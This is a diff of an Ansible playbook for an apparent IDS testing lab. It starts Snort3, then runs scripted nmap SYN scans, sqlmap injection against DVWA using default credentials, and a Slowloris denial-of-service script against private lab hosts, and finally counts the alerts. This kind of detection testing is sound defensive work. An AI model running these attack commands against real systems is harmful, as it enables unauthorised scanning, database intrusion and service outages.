@@ -1,73 +1,113 @@
 ---
-- name: ARCHIVIRT - Start Snort 3
+# ARCHIVIRT - IDS Test Scenario Playbook (IaC compliant)
+# Author: Yasnemanegre SAWADOGO (SPbGUPTD)
+# Usage: ansible-playbook run_scenario.yml -e "scenario=SCN-001"
+
+- name: ARCHIVIRT - Start Snort3 on monitor
   hosts: monitor
   become: yes
+  vars:
+    scenario: "{{ scenario | default('SCN-001') }}"
+    snort_script: /opt/archivirt/scripts/run_snort.sh
+
   tasks:
-    - name: Stop any running Snort
-      shell: pkill -f snort || true
+    - name: Deploy run_snort.sh to monitor
+      copy:
+        src: /home/archivirt/ARCHIVIRT/scripts/run_snort.sh
+        dest: /opt/archivirt/scripts/run_snort.sh
+        mode: 0755
+
+    - name: Stop any previous Snort3 instance
+      shell: "bash {{ snort_script }} stop {{ scenario }}"
       ignore_errors: yes
 
-    - name: Clear alert logs
-      shell: |
-        truncate -s 0 /var/log/snort3/alert_fast.txt
-        truncate -s 0 /var/log/snort3/alert_json.txt
+    - name: Start Snort3 for scenario
+      shell: "bash {{ snort_script }} start {{ scenario }}"
 
-    - name: Set ens4 promiscuous
-      shell: ip link set ens4 up && ip link set ens4 promisc on
-
-    - name: Start Snort 3 background
-      shell: |
-        nohup /usr/local/bin/snort \
-          -c /etc/snort3/snort.lua \
-          -i ens4 -l /var/log/snort3 \
-          --daq-dir /usr/local/lib/daq/ \
-          > /var/log/snort3/snort_stdout.log 2>&1 &
-        echo $! > /var/run/snort3.pid
-        sleep 8
-        pgrep snort && echo "Snort3 OK"
-
-- name: ARCHIVIRT - Run Attack SCN-001
+- name: ARCHIVIRT - Run attack scenario
   hosts: attacker
   become: yes
+  vars:
+    scenario: "{{ scenario | default('SCN-001') }}"
+
   tasks:
-    - name: Port Scan 10 runs
+    - name: "SCN-001 Port Scan"
       shell: |
         for i in $(seq 1 10); do
           nmap -sS -Pn -p 1-1024 --min-rate 1000 -T4 \
             10.0.2.11 10.0.2.12 10.0.2.13 -oN /dev/null 2>/dev/null
           sleep 3
         done
-        echo "SCN-001 DONE"
+      when: scenario == "SCN-001"
 
-- name: ARCHIVIRT - Stop Snort and collect results
+    - name: "SCN-002 SSH Brute-force"
+      shell: |
+        for i in $(seq 1 10); do
+          nmap -sS -Pn -p 22 --min-rate 500 -T4 \
+            10.0.2.11 10.0.2.12 10.0.2.13 2>/dev/null
+          sleep 3
+        done
+      when: scenario == "SCN-002"
+
+    - name: "SCN-003 SQL Injection"
+      block:
+        - name: Get DVWA cookie
+          shell: |
+            COOKIE=$(curl -s -c - 'http://10.0.2.11/dvwa/login.php' --data 'username=admin&password=password&Login=Login' | grep PHPSESSID | awk '{print $NF}')
+            echo $COOKIE
+          register: dvwa_cookie
+
+        - name: Run sqlmap with valid cookie
+          shell: |
+            for i in $(seq 1 10); do
+              sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+                --cookie="PHPSESSID={{ dvwa_cookie.stdout }};security=low" \
+                --batch --level=1 --risk=1 --technique=B \
+                --output-dir=/tmp/sqlmap_$i 2>/dev/null
+              sleep 5
+            done
+      when: scenario == "SCN-003"
+
+    - name: "SCN-004 DDoS Slowloris"
+      shell: |
+        for i in $(seq 1 10); do
+          timeout 20 python3 /opt/archivirt/attack-scripts/slowloris.py \
+            10.0.2.11 --port 80 --sockets 150 --duration 15 2>/dev/null
+          sleep 5
+        done
+      when: scenario == "SCN-004"
+
+    - name: "SCN-005 Normal Traffic"
+      shell: |
+        for i in $(seq 1 10); do
+          curl -s http://10.0.2.11/ > /dev/null
+          curl -s http://10.0.2.12/ > /dev/null
+          sleep 3
+        done
+      when: scenario == "SCN-005"
+
+- name: ARCHIVIRT - Stop Snort3 and collect results
   hosts: monitor
   become: yes
+  vars:
+    scenario: "{{ scenario | default('SCN-001') }}"
+    snort_script: /opt/archivirt/scripts/run_snort.sh
+
   tasks:
-    - name: Stop Snort
-      shell: |
-        kill -SIGINT $(cat /var/run/snort3.pid 2>/dev/null) 2>/dev/null || pkill -f snort || true
-        sleep 5
+    - name: Stop Snort3
+      shell: "bash {{ snort_script }} stop {{ scenario }}"
+      ignore_errors: yes
+
+    - name: Fetch alert_fast.txt
+      fetch:
+        src: "/var/log/snort3/{{ scenario }}/alert_fast.txt"
+        dest: "/tmp/snort3_{{ scenario }}.txt"
+        flat: yes
 
     - name: Count alerts
-      shell: |
-        python3 -c "
-import json
-rules={'1:9000001:1':'ICMP Test','1:9000002:1':'TCP SYN Scan',
-       '1:9000003:1':'SSH Brute-force','1:9000004:1':'HTTP Connection',
-       '1:9000005:1':'Slowloris DDoS'}
-counts={}
-with open('/var/log/snort3/alert_json.txt') as f:
-  for line in f:
-    try:
-      d=json.loads(line)
-      r=rules.get(d.get('rule','?'),'OTHER')
-      counts[r]=counts.get(r,0)+1
-    except: pass
-for k,v in sorted(counts.items()): print(f'{k}: {v}')
-print('TOTAL:', sum(counts.values()))
-"
-      register: results
+      shell: wc -l < /var/log/snort3/{{ scenario }}/alert_fast.txt
+      register: alert_count
 
     - name: Show results
       debug:
-        msg: "{{ results.stdout }}"
+        msg: "{{ scenario }}: {{ alert_count.stdout }} alerts"
